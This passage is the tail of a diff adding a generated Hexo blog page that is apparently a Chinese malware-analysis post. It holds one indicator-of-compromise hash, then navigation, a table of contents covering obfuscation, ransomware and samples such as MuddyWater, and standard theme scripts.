+<li>Ioc：36ccae4dffc70249c79cd3156de1cd238af8f7a3e47dc90a1c33476cf97a77b0</li>
+</ul>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/05/30/病毒分析技术_21_针对KingSqlZ组织一次攻击的分析报告/" rel="next" title="针对KingSqlZ组织一次攻击的分析报告">
+                <i class="fa fa-chevron-left"></i> 针对KingSqlZ组织一次攻击的分析报告
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2019/07/16/病毒分析技术_23_linux样本分析小结/" rel="prev" title="linux下样本分析小结">
+                linux下样本分析小结 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">findream</p>
+              <p class="site-description motion-element" itemprop="description">Apes--change the world's animals</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">49</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                
+                  <span class="site-state-item-count">10</span>
+                  <span class="site-state-item-name">分类</span>
+                
+              </div>
+            
+
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          <div class="links-of-author motion-element">
+            
+          </div>
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#0x1-常见混淆"><span class="nav-number">1.</span> <span class="nav-text">0x1 常见混淆</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x2-勒索软件"><span class="nav-number">2.</span> <span class="nav-text">0x2 勒索软件</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x3-流量欺骗"><span class="nav-number">3.</span> <span class="nav-text">0x3 流量欺骗</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x4-驱动人生样本"><span class="nav-number">4.</span> <span class="nav-text">0x4 驱动人生样本</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#总结："><span class="nav-number">4.1.</span> <span class="nav-text">总结：</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x5-MuddyWater样本"><span class="nav-number">5.</span> <span class="nav-text">0x5 MuddyWater样本</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">findream</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.3</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+  
+  <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.3"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.3"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.3"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.3"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.3"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
